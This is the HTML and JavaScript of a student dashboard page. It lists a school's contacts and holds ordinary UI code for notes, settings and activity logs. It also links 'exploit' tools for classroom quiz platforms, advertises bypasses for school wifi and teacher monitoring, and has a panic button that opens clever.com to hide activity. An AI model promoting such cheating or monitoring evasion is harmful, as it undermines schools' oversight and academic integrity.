          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <h2>üß® Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <h2>üö™ Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
        </div>
        
        <div id="bathroomBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="wifiBypass" class="bypass-content">
          <p>Go to School Wifi Information</p>
        </div>
        
        <div id="monitoringBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming1Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming2Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming3Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <h2>üîê VPN Websites</h2>
        <div class="links-list">
          <a href="https://example-vpn1.com" target="_blank">VPN Service 1</a>
          <a href="https://example-vpn2.com" target="_blank">VPN Service 2</a>
          <a href="https://example-vpn3.com" target="_blank">VPN Service 3</a>
          <a href="https://example-vpn4.com" target="_blank">VPN Service 4</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <h2>üéÆ Gaming Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <h2>üéµ Music Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <h2>üéπ Keyboard Tricks</h2>
        <div class="info-text">
          <p>System Shortcuts:
‚Ä¢ Access Spotlight Search: Press¬†Command (‚åò) + Space bar.
‚Ä¢ Return to the Home screen: Press¬†Command (‚åò) + H.
‚Ä¢ Show the Dock: Press¬†Command (‚åò) + Option (‚å•) + D.
‚Ä¢ Show the App Library: Press¬†Shift (‚áß) + Globe + A.
‚Ä¢ Open Quick Note: Press Globe + Q.
‚Ä¢ Open Siri: Press Globe + S.
‚Ä¢ Open Control Center: Press Globe + C.
‚Ä¢ Open Notification Center: Press Globe + N.
‚Ä¢ Show all windows: Press¬†Globe + Down Arrow.
‚Ä¢ Open the App Switcher: Press¬†Globe + Up Arrow.
Multitasking Shortcuts:
‚Ä¢ Switch to the last active app: Press¬†Command (‚åò) + Tab.
‚Ä¢ View all active apps: Press and hold Command (‚åò) + Tab.
‚Ä¢ Open Split View: Press Control (‚åÉ) + Globe + Left Arrow to move an app to the left, or Control (‚åÉ) + Globe + Right Arrow to move it to the right.
‚Ä¢ Switch the position of apps in Split View: Press¬†Control (‚åÉ) + Globe + Left or Right Arrow.
‚Ä¢ Open Slide Over: Press Globe + Backslash.
‚Ä¢ Move the Slide Over window: Press¬†Option (‚å•) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
‚Ä¢ Take a full-screen screenshot: Press¬†Command (‚åò) + Shift + 3.
‚Ä¢ Take a screenshot and enter markup immediately: Press¬†Command (‚åò) + Shift + 4.
‚Ä¢ Open a new private tab: Press¬†Command (‚åò) + Shift + N.
‚Ä¢ Open a new tab: Press Command (‚åò) + T or Command (‚åò) + N.
‚Ä¢ Close the current tab: Press Command (‚åò) + W.
‚Ä¢ Close all tabs in Tab Grid: Press Shift + Command (‚åò) + W.
‚Ä¢ Go to the next tab: Press Option (‚å•) + Command (‚åò) + Right Arrow, or Control (‚åÉ) + Tab, or Command (‚åò) + }.
‚Ä¢ Go to the previous tab: Press Option (‚å•) + Command (‚åò) + Left Arrow, or Shift + Control (‚åÉ) + Tab, or Command (‚åò) + {.
‚Ä¢ Reopen the last closed tab: Press¬†Shift + Command (‚åò) + T.
‚Ä¢ Go to a specific tab (1-8): Press¬†Command (‚åò) + (1-8).
‚Ä¢ Go to the last tab: Press Command (‚åò) + 9.
‚Ä¢ Open the Tab Grid: Press Shift + Command (‚åò) + .
‚Ä¢ Open a new Incognito tab: Press¬†Shift + Command (‚åò) + N.
‚Ä¢ Open a new Incognito window: Press¬†Option (‚å•) + Shift + Command (‚åò) + N.
‚Ä¢ Open a new window: Press¬†Option (‚å•) + Command (‚åò) + N.
General Navigation and Text Editing:
‚Ä¢ Navigate between elements in an app (like fields, lists, buttons): Press Tab.
‚Ä¢ Select all text: Press Command (‚åò) + A.
‚Ä¢ Copy selected text: Press Command (‚åò) + C.
‚Ä¢ Cut selected text: Press Command (‚åò) + X.
‚Ä¢ Paste copied text: Press Command (‚åò) + V.
‚Ä¢ Undo the last action: Press Command (‚åò) + Z.
‚Ä¢ Redo the last undone action: Press Command (‚åò) + Shift + Z.
‚Ä¢ Jump to the top of a page: Press Command (‚åò) + Up Arrow.
‚Ä¢ Jump to the bottom of a page: Press Command (‚åò) + Down Arrow.
‚Ä¢ Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using,¬†press and hold the Command (‚åò) key.¬†For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>
    </div>

    <!-- Notes Canvas (full width or centrally placed, depends on layout) -->
    <div id="canvasContainer">
      <h2>üñåÔ∏è Notes Canvas</h2>
      <canvas id="notesCanvas" width="800" height="600"></canvas>
      <div id="canvasControls">
        <label for="noteThicknessSlider">Thickness:</label>
        <input type="range" id="noteThicknessSlider" min="1" max="15" value="2">
        <label for="noteColorPicker">Color:</label>
        <input type="color" id="noteColorPicker" value="#ff914d">
        <select id="noteMaterialSelect">
            <option value="solid">Solid</option>
            <option value="pencil">Pencil</option>
            <option value="watercolor">Watercolor</option>
        </select>
        <button id="toggleTextNotesBtn">üìù Text Notes</button>
        <button id="undoNotesBtn"><i class="fas fa-undo"></i> Undo</button>
        <button id="redoNotesBtn"><i class="fas fa-redo"></i> Redo</button>
        <button id="saveNotesBtn">üíæ Save Notes</button>
        <button id="loadNotesBtn">üìÇ Load Notes</button>
        <button id="printNotesBtn">üñ®Ô∏è Print Notes</button>
        <button id="clearCanvasBtn">üóëÔ∏è Clear Canvas</button>
        <button id="closeCanvasBtn">‚úñÔ∏è Close Notes</button>
      </div>
      <input type="text" id="textNoteInput" placeholder="Type your text note here...">
    </div>
  </div>

  <script>
    // Utility functions and constants
    const LOGGING_LEVEL_FULL = 'full';
    const LOGGING_LEVEL_MINIMAL = 'minimal';
    const LOGGING_LEVEL_NONE = 'none';

    const loginPageData = {
        attempts: 3, // Changed from 5 to 3
        is24HourFormat: false,
        zoomLevel: 1.0,
        loginStartTime: null
    };

    const dashboardData = {
        sessionStartTime: null,
        zoomLevel: 1.0,
        activityLog: [],
        loginHistory: [],
        stats: {
            clicks: 0,
            panelsOpened: 0,
            canvasCleared: 0,
            loginAttempts: 0,
            successfulLogins: 0,
            timeToolStarts: 0,
            timeToolResets: 0,
            remindersSet: 0,
            calculatorOperations: 0,
            unitConversions: 0
        },
        settings: {
            welcomeNotification: true,
            announcementBar: true,
            calendarVisible: true,
            updatesVisible: true,
            notificationsVisible: true,
            motivationVisible: true,
            factVisible: true,
            quoteVisible: true,
            fontSize: 1, // 0.9 (small), 1 (medium), 1.1 (large)
            locale: 'en-US',
            enablePanelDrag: false,
            activityLoggingLevel: LOGGING_LEVEL_FULL,
        },
        activeKeybinds: {
            'N': 'notesBtn',
            'P': 'panicBtn',
            'S': 'settingsBtn'
        },
        currentTheme: 'dark-theme',
        notes: {
            currentPath: [], // For undo/redo
            history: [],
            historyIndex: -1,
            drawingMode: 'draw', // 'draw' or 'text'
        }
    };


    // Helper for adding logs
    function addActivityLog(event, details = '') {
        const level = dashboardData.settings.activityLoggingLevel;
        if (level === LOGGING_LEVEL_NONE) return;

        const timestamp = new Date().toLocaleString();
        let logEntry = `[${timestamp}] ${event}`;
        if (details) logEntry += `: ${details}`;

        if (level === LOGGING_LEVEL_MINIMAL && (event.startsWith("Panel Toggle:") || event.startsWith("Button Click:"))) {
            // Only log minimal types, or customize
            dashboardData.activityLog.unshift(logEntry); // Add to beginning
            if (dashboardData.activityLog.length > 50) dashboardData.activityLog.pop(); // Keep log size manageable
            updateActivityLogDisplay();
        } else if (level === LOGGING_LEVEL_FULL) {
            dashboardData.activityLog.unshift(logEntry); // Add to beginning
            if (dashboardData.activityLog.length > 100) dashboardData.activityLog.pop();
            updateActivityLogDisplay();
        }
    }

    function updateActivityLogDisplay() {
        const activityLogList = document.getElementById('activityLogList');
        if (activityLogList) {
            activityLogList.innerHTML = '';
            if (dashboardData.activityLog.length === 0) {
                const li = document.createElement('li');
                li.textContent = 'No activity logged yet.';
                activityLogList.appendChild(li);
            } else {
                dashboardData.activityLog.forEach(log => {
                    const li = document.createElement('li');
                    li.textContent = log;
                    activityLogList.appendChild(li);
                });
            }
        }
    }

    // Dashboard functionality object
    const dashboard = {
      // Initialize all dashboard functionality
      init: function() {
        dashboardData.sessionStartTime = new Date();
        this.initSessionTimer();
        this.initClock(); // Using the main initClock for dashboard as well
        this.generateCalendar();
        this.initThemes(); // Initialize themes, set default/saved
        this.initDashboardButtons();
        this.initInfoPanelToggles(); // Setup toggles for individual panels
        this.initCanvas();
        this.initRandomFacts();
        this.initDailyQuotes();
        this.initPanelResize(); // Apply resize to dashboard main boxes and panels
        this.initKeybinds();
        this.initTimeTools(); // Initialize Timer, Stopwatch, Reminders
        this.initCalculator();
        this.initUnitConverter();
        this.loadStats(); // Load user stats
        this.initMedia(); // Initialize media player
        this.loadLoginHistory(); // Load login history
        this.applySettings(); // Apply settings on load

        document.body.classList.add('dashboard-body');
        document.body.classList.remove('login-active');
        document.documentElement.style.setProperty('--dashboard-font-size-scale', dashboardData.settings.fontSize);

        addActivityLog('System Initialized', `User ${document.getElementById('loggedInUser').textContent} logged in.`);
        
        // Show welcome notification
        if (dashboardData.settings.welcomeNotification) {
            this.showWelcomeNotification();
        }
        if (!dashboardData.settings.announcementBar) {
            document.getElementById('announcementBar').style.display = 'none';
        }
        updateActivityLogDisplay();
        this.trackPageActions(); // Start tracking actions
      },

      trackStats: function(statName, increment = 1) {
        dashboardData.stats[statName] = (dashboardData.stats[statName] || 0) + increment;
        this.saveStats();
        this.updateStatsDisplay();
      },

      saveStats: function() {
        localStorage.setItem('dashboardStats', JSON.stringify(dashboardData.stats));
      },

      loadStats: function() {
        const savedStats = localStorage.getItem('dashboardStats');
        if (savedStats) {
            dashboardData.stats = JSON.parse(savedStats);
        }
        this.updateStatsDisplay();
      },

      resetStats: function() {
        if (confirm("Are you sure you want to reset all user statistics? This cannot be undone.")) {
            dashboardData.stats = {
                clicks: 0,
                panelsOpened: 0,
                canvasCleared: 0,
                loginAttempts: 0,
                successfulLogins: 0,
                timeToolStarts: 0,
                timeToolResets: 0,
                remindersSet: 0,
                calculatorOperations: 0,
                unitConversions: 0
            };
            this.saveStats();
            this.updateStatsDisplay();
            this.displayAlert('Statistics have been reset!', 'warning');
            addActivityLog('Stats Reset');
        }
      },

      updateStatsDisplay: function() {
        document.getElementById('statClicks').textContent = dashboardData.stats.clicks;
        document.getElementById('statPanelsOpened').textContent = dashboardData.stats.panelsOpened;
        document.getElementById('statCanvasCleared').textContent = dashboardData.stats.canvasCleared;
        document.getElementById('statLoginAttempts').textContent = dashboardData.stats.loginAttempts;
        document.getElementById('statSuccessfulLogins').textContent = dashboardData.stats.successfulLogins;
        // Update other stats as needed
      },

      trackPageActions: function() {
          document.addEventListener('click', (event) => {
              if (event.target.tagName === 'BUTTON' || event.target.closest('button')) {
                  this.trackStats('clicks');
                  const buttonText = (event.target.textContent || event.target.alt || event.target.title).trim().substring(0, 50);
                  addActivityLog('Button Click', `Clicked: "${buttonText}"`);
              } else if (event.target.tagName === 'A' || event.target.closest('a')) {
                  this.trackStats('clicks');
                  const linkText = (event.target.textContent || event.target.alt || event.target.title).trim().substring(0, 50);
                  addActivityLog('Link Click', `Clicked: "${linkText}"`);
              }
          });
      },

      displayAlert: function(message, type = 'info') { // type: info, success, warning, error
        const alertsContainer = document.getElementById('dashboardAlerts');
        const alertDiv = document.createElement('div');
        alertDiv.classList.add('dashboard-alert');
        if (type === 'important') alertDiv.classList.add('important'); // Specific style for panic
        alertDiv.innerHTML = `<span>${message}</span> <button onclick="this.parentNode.remove()">‚úï</button>`;
        alertsContainer.prepend(alertDiv); // Add to top of stack

        setTimeout(() => {
          alertDiv.classList.add('show');
        }, 10);

        setTimeout(() => {
          alertDiv.classList.remove('show');
          alertDiv.addEventListener('transitionend', () => alertDiv.remove());
        }, 8000); // Alert disappears after 8 seconds
      },
      
      // Welcome Notification
      showWelcomeNotification: function() {
          const welcomeNotification = document.getElementById('dashboardWelcomeNotification');
          const username = document.getElementById('loggedInUser').textContent;
          document.getElementById('welcomeMessage').textContent = `Welcome, ${username}!`;
          welcomeNotification.classList.add('show');
          
          setTimeout(() => {
              this.hideWelcomeNotification();
          }, 10000); // Hide after 10 seconds automatically
      },
      
      hideWelcomeNotification: function() {
          const welcomeNotification = document.getElementById('dashboardWelcomeNotification');
          welcomeNotification.classList.remove('show');
      },

      // Initialize session timer
      initSessionTimer: function() {
        let sessionInterval;
        const sessionStartTime = dashboardData.sessionStartTime;

        function updateSessionTime() {
          const now = new Date();
          const diffSeconds = Math.floor((now - sessionStartTime) / 1000);
          
          const hrs = String(Math.floor(diffSeconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((diffSeconds % 3600) / 60)).padStart(2, '0');
          const secs = String(diffSeconds % 60).padStart(2, '0');
          document.getElementById('sessionTime').innerText = `‚è≥ Session Time: ${hrs}:${mins}:${secs}`;
        }
        
        updateSessionTime();
        sessionInterval = setInterval(updateSessionTime, 1000);
      },
      
      // Initialize real-time clock
      initClock: function(forLoginPage = false) {
        let clockInterval;
        const timeElement = forLoginPage ? document.getElementById('loginCurrentTime') : document.getElementById('realTimeClock');
        const dateElement = forLoginPage ? document.getElementById('loginCurrentDate') : document.getElementById('realDate');
        const is24HourToggle = document.getElementById('toggle24HourFormat');

        function updateClock() {
          const now = new Date();
          const optionsTime = { 
            hour: 'numeric', 
            minute: 'numeric', 
            second: 'numeric', 
            hour12: !loginPageData.is24HourFormat // Use 24-hour format if toggled
          };
          const timeStr = now.toLocaleTimeString(navigator.language, optionsTime);
          const dateStr = now.toLocaleDateString(navigator.language, { month: 'long', day: 'numeric', year: 'numeric' });

          if (timeElement) timeElement.innerText = (forLoginPage ? '' : 'üïí ') + timeStr;
          if (dateElement) dateElement.innerText = (forLoginPage ? '' : 'üìÖ ') + dateStr;
        }

        if (is24HourToggle) {
            is24HourToggle.addEventListener('change', (e) => {
                loginPageData.is24HourFormat = e.target.checked;
                addActivityLog('Time Format Toggle', `Changed to ${loginPageData.is24HourFormat ? '24-Hour' : '12-Hour'}`);
                updateClock(); // Update clock immediately with new format
            });
        }
        
        updateClock();
        clockInterval = setInterval(updateClock, 1000);
        // Store interval ID to clear if needed (e.g., on logout)
        if (forLoginPage) loginPageData.clockInterval = clockInterval;
        else dashboardData.clockInterval = clockInterval;
      },
      
      // Generate calendar
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        calendar.innerHTML = ''; 
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
      },

      initThemes: function() {
        const savedTheme = localStorage.getItem('dashboardTheme');
        if (savedTheme) {
            this.setTheme(savedTheme);
        } else {
            this.setTheme('dark-theme'); // Default theme
        }
      },
      
      setTheme: function(themeName) {
          document.body.className = `dashboard-body ${themeName}`;
          dashboardData.currentTheme = themeName;
          localStorage.setItem('dashboardTheme', themeName);

          const themeBtn = document.getElementById('themeToggle');
          if (themeBtn) {
            if (themeName.includes('light-theme')) {
              themeBtn.innerHTML = '<i class="fas fa-sun"></i> Light Mode';
              // Also update the dark mode toggle in settings
              if (document.getElementById('settingDarkModeToggle')) {
                  document.getElementById('settingDarkModeToggle').checked = false;
              }
            } else {
              themeBtn.innerHTML = '<i class="fas fa-moon"></i> Dark Mode';
               if (document.getElementById('settingDarkModeToggle')) {
                  document.getElementById('settingDarkModeToggle').checked = true;
              }
            }
          }
          addActivityLog('Theme Change', `Theme set to: ${themeName}`);
          // Update setting state
          const dmSetting = document.getElementById('settingDarkModeToggle');
          if (dmSetting) dmSetting.checked = (themeName === 'dark-theme');
      },

      // Unified dashboard buttons init
      initDashboardButtons: function() {
        document.getElementById('panicBtn').addEventListener('click', () => {
            window.open('https://clever.com', '_blank');
            addActivityLog('Button Click', 'Panic button pressed, redirected to Clever.');
            this.displayAlert('Redirecting to Clever.com in a new tab...', 'important');
        });

        document.getElementById('logoutBtn').addEventListener('click', () => {
          if(confirm('Are you sure you want to log out?')) {
            addActivityLog('User Logged Out', `User ${document.getElementById('loggedInUser').textContent} logged out.`);
            localStorage.setItem('lastLogin', JSON.stringify({
                user: document.getElementById('loggedInUser').textContent,
                id: document.getElementById('loggedInID').textContent,
                time: new Date().toLocaleString()
            })); // Save last login
            // Clear activity logs or persist based on requirements
            localStorage.setItem('activityLog', JSON.stringify(dashboardData.activityLog)); // Persist dashboard activity log
            
            // Re-render the initial loading state (or go back to a clean login screen)
            window.location.reload(); 
          }
        });
        
        document.getElementById('restartBtn').addEventListener('click', () => {
          if(confirm('Are you sure you want to restart the dashboard (refresh page)?')) {
            addActivityLog('Dashboard Restart', 'User initiated a dashboard restart.');
            window.location.reload(); // Simple page reload for restart
          }
        });

        document.getElementById('fixIssuesBtn').addEventListener('click', () => {
          this.displayAlert('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!');
          addActivityLog('Action: Fix Issues', 'Diagnostics ran, no issues reported.');
        });
        
        document.getElementById('fullScreenBtn').addEventListener('click', () => {
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
              this.displayAlert(`Error attempting to enable full-screen mode: ${err.message}`, 'error');
            });
            addActivityLog('Action: Full Screen', 'Enabled full screen mode.');
          } else {
            document.exitFullscreen();
            addActivityLog('Action: Full Screen', 'Disabled full screen mode.');
          }
        });
        
        // Zoom functionality moved to the main dashboard quickbar in a unified approach
        document.getElementById('dashboardSearchBtn').addEventListener('click', () => this.handleDashboardSearch());
        document.getElementById('dashboardSearchInput').addEventListener('keydown', (e) => {
            if (e.key === 'Enter') this.handleDashboardSearch();
        });
        document.getElementById('downloadActivityLogsBtn').addEventListener('click', () => this.downloadActivityLogs());
        document.getElementById('settingsBtn').addEventListener('click', () => this.togglePanel('settingsPanel'));
        document.getElementById('themeToggle').addEventListener('click', () => this.togglePanel('themesPanel')); // Now opens themes panel
        document.getElementById('utilityPanelBtn').addEventListener('click', () => this.togglePanel('dashboardUtilitiesPanel'));
      
        document.getElementById('sessionTime').addEventListener('click', () => addActivityLog('Panel Info', 'Session Time displayed.'));
        document.getElementById('realTimeClock').addEventListener('click', () => addActivityLog('Panel Info', 'Real Time Clock displayed.'));
        document.getElementById('realDate').addEventListener('click', () => addActivityLog('Panel Info', 'Real Date displayed.'));
        document.getElementById('notesBtn').addEventListener('click', () => { this.toggleNotesCanvas(); this.trackStats('panelsOpened'); });
        document.getElementById('exportNotesBtn').addEventListener('click', () => this.exportCanvasAsImage());
        document.getElementById('screenshotBtn').addEventListener('click', () => this.takeScreenshot());
        document.getElementById('toggleSectionsBtn').addEventListener('click', () => this.toggleMainSections());
        document.getElementById('loginHistoryBtn').addEventListener('click', () => { this.togglePanel('loginHistoryPanel'); this.trackStats('panelsOpened'); });
        document.getElementById('activityLogsBtn').addEventListener('click', () => { this.togglePanel('activityLogPanel'); this.trackStats('panelsOpened'); updateActivityLogDisplay(); });
        document.getElementById('keybindsBtn').addEventListener('click', () => { this.togglePanel('keybindsPanel'); this.trackStats('panelsOpened'); });
        document.getElementById('timeToolsBtn').addEventListener('click', () => { this.togglePanel('timeToolsPanel'); this.trackStats('panelsOpened'); });
        document.getElementById('calculatorBtn').addEventListener('click', () => { this.togglePanel('calculatorPanel'); this.trackStats('panelsOpened'); });
        document.getElementById('unitConverterBtn').addEventListener('click', () => { this.togglePanel('unitConverterPanel'); this.trackStats('panelsOpened'); });
        document.getElementById('statsBtn').addEventListener('click', () => { this.togglePanel('statsPanel'); this.trackStats('panelsOpened'); });
        document.getElementById('mediaBtn').addEventListener('click', () => { this.togglePanel('mediaPanel'); this.trackStats('panelsOpened'); });


        // Set up the panel toggles in the quick-bar like original quick-bar buttons
        const infoPanelQuickBar = document.querySelector('.quick-bar[style*="margin-top: 30px;"]');
        if (infoPanelQuickBar) {
            Array.from(infoPanelQuickBar.children).forEach(button => {
                if (button.tagName === 'BUTTON') {
                    // Attach togglePanel dynamically
                    const panelId = button.onclick.toString().match(/'(.*?)'/)[1]; // Extract panelId from onclick
                    button.onclick = null; // Clear existing onclick
                    button.addEventListener('click', () => {
                        this.togglePanel(panelId);
                        this.trackStats('panelsOpened');
                        addActivityLog('Panel Toggle', `Toggled: ${panelId}`);
                    });
                }
            });
        }
      },

      initInfoPanelToggles: function() {
        const panels = ['calendarBox', 'updatesBox', 'notificationsBox', 'motivationBox', 'randomFactBox', 'dailyQuoteBox'];
        panels.forEach(id => {
            const toggleId = 'setting' + id.replace('Box', 'Visible').charAt(0).toUpperCase() + id.replace('Box', 'Visible').slice(1);
            const toggleElement = document.getElementById(toggleId);
            if (toggleElement) {
                toggleElement.checked = dashboardData.settings[id.replace('Box', 'Visible')];
                document.getElementById(id).style.display = toggleElement.checked ? 'block' : 'none';

                toggleElement.addEventListener('change', (e) => {
                    const panelElement = document.getElementById(id);
                    if (panelElement) {
                        panelElement.style.display = e.target.checked ? 'block' : 'none';
                        dashboardData.settings[id.replace('Box', 'Visible')] = e.target.checked;
                        this.saveSettings();
                        addActivityLog('Panel Visibility Toggle', `${id} visibility set to ${e.target.checked ? 'visible' : 'hidden'}`);
                    }
                });
            }
        });
      },

      applySettings: function() {
        // Load and apply settings
        const savedSettings = localStorage.getItem('dashboardSettings');
        if (savedSettings) {
            dashboardData.settings = { ...dashboardData.settings, ...JSON.parse(savedSettings) };
        }

        // Apply welcome notification setting
        document.getElementById('settingWelcomeNotification').checked = dashboardData.settings.welcomeNotification;
        document.getElementById('settingWelcomeNotification').addEventListener('change', (e) => {
            dashboardData.settings.welcomeNotification = e.target.checked;
            this.saveSettings();
        });

        // Apply announcement bar setting
        const announcementBar = document.getElementById('announcementBar');
        document.getElementById('settingAnnouncementBar').checked = dashboardData.settings.announcementBar;
        if (!dashboardData.settings.announcementBar) {
            announcementBar.style.display = 'none';
        }
        document.getElementById('settingAnnouncementBar').addEventListener('change', (e) => {
            announcementBar.style.display = e.target.checked ? 'block' : 'none';
            dashboardData.settings.announcementBar = e.target.checked;
            this.saveSettings();
        });

        // Apply dark mode toggle from settings (link to themeToggle logic)
        document.getElementById('settingDarkModeToggle').checked = (dashboardData.currentTheme === 'dark-theme');
        document.getElementById('settingDarkModeToggle').addEventListener('change', (e) => {
            this.setTheme(e.target.checked ? 'dark-theme' : 'light-theme');
        });

        // Apply panel visibility settings (re-run initInfoPanelToggles)
        this.initInfoPanelToggles();

        // Apply font size
        const fontSizeSelect = document.getElementById('settingFontSize');
        if (fontSizeSelect) {
            fontSizeSelect.value = dashboardData.settings.fontSize;
            document.documentElement.style.fontSize = `${dashboardData.settings.fontSize * 16}px`; // Adjust base font size
            fontSizeSelect.addEventListener('change', (e) => {
                dashboardData.settings.fontSize = parseFloat(e.target.value);
                document.documentElement.style.fontSize = `${dashboardData.settings.fontSize * 16}px`;
                this.saveSettings();
                addActivityLog('Settings Update', `Font size set to ${e.target.value}`);
            });
        }
        // Apply locale
        const localeSelect = document.getElementById('settingLocale');
        if (localeSelect) {
            localeSelect.value = dashboardData.settings.locale;
            localeSelect.addEventListener('change', (e) => {
                dashboardData.settings.locale = e.target.value;
                this.saveSettings();
                // window.location.reload(); // Might need a reload for full language support
                this.displayAlert(`Locale set to ${e.target.value}. Some changes may require refresh.`);
                addActivityLog('Settings Update', `Locale set to ${e.target.value}`);
            });
        }

        // Apply activity logging level
        const loggingLevelSelect = document.getElementById('settingActivityLoggingLevel');
        if (loggingLevelSelect) {
            loggingLevelSelect.value = dashboardData.settings.activityLoggingLevel;
            loggingLevelSelect.addEventListener('change', (e) => {
                dashboardData.settings.activityLoggingLevel = e.target.value;
                this.saveSettings();
                this.displayAlert(`Activity logging level set to "${e.target.value}".`);
                addActivityLog('Settings Update', `Activity logging level set to ${e.target.value}`);
            });
        }
        
        // Clear Cache and Reset Layout buttons
        document.getElementById('settingClearCache').addEventListener('click', () => this.clearCache());
        document.getElementById('settingResetLayout').addEventListener('click', () => this.resetLayout());
        // For draggable, no JS for actual dragging is implemented yet, but checkbox toggles the flag
        document.getElementById('settingEnablePanelDrag').checked = dashboardData.settings.enablePanelDrag;
        document.getElementById('settingEnablePanelDrag').addEventListener('change', (e) => {
            dashboardData.settings.enablePanelDrag = e.target.checked;
            this.saveSettings();
            this.displayAlert(`Panel Dragging: ${e.target.checked ? 'Enabled' : 'Disabled'}. (Requires external library for full functionality)`);
            addActivityLog('Settings Update', `Panel dragging ${e.target.checked ? 'enabled' : 'disabled'}.`);
        });

      },

      saveSettings: function() {
        localStorage.setItem('dashboardSettings', JSON.stringify(dashboardData.settings));
        addActivityLog('Settings Saved');
      },

      clearCache: function() {
        if (confirm("Are you sure you want to clear all local dashboard cache (settings, logs, history, stats)? This cannot be undone.")) {
            localStorage.removeItem('dashboardSettings');
            localStorage.removeItem('dashboardStats');
            localStorage.removeItem('activityLog');
            localStorage.removeItem('loginHistory');
            localStorage.removeItem('dashboardTheme');
            this.displayAlert("Dashboard cache cleared!", 'success');
            addActivityLog('System Action', 'Cleared dashboard local cache.');
            // A reload might be necessary after clearing cache
            window.location.reload();
        }
      },

      resetLayout: function() {
          if (confirm("Are you sure you want to reset dashboard panel positions and sizes?")) {
              document.querySelectorAll('.box, .info-panel, #canvasContainer').forEach(panel => {
                  panel.style.top = '';
                  panel.style.left = '';
                  panel.style.width = '';
                  panel.style.height = '';
                  // Also reset initial display settings if they are default for boxes
                  if (panel.id === 'canvasContainer' || panel.classList.contains('info-panel')) {
                      panel.style.display = 'none';
                  } else {
                       panel.style.display = 'block'; // Or flex, based on initial layout
                  }
              });
              this.displayAlert("Dashboard layout reset to default!", 'success');
              addActivityLog('System Action', 'Reset dashboard layout to default.');
              window.location.reload(); // Refresh to ensure layout fully resets.
          }
      },

      initPanelResize: function() {
        // Basic CSS resizing is already enabled for .box and .info-panel with `resize: both`
        // For full drag-and-drop, an external library like interact.js would be used:
        /*
        // For drag and drop (requires interact.js library)
        interact('.box, .info-panel, #canvasContainer')
            .draggable({
                inertia: true,
                modifiers: [
                    interact.modifiers.restrictRect({
                        restriction: 'parent', // Or 'window'
                        endOnly: true
                    })
                ],
                autoScroll: true,
                listeners: {
                    move: (event) => {
                        let target = event.target;
                        let x = (parseFloat(target.getAttribute('data-x')) || 0) + event.dx;
